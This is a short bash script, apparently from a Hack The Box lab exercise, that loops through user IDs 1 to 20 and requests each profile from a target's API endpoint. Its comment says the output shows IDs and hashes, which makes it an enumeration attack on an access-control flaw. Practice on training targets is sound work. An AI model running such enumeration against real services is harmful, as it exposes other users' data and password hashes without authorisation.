#!/usr/bin/env bash

# HTB target
url="http://83.136.255.106:41350"
api_uri="/profile/api.php/profile/"

for i in {1..20}; do
    curl -sS -X GET "$url/$api_uri$i"

    # shows ID and hash, just to watch the process.
    echo "ID: $i"
done
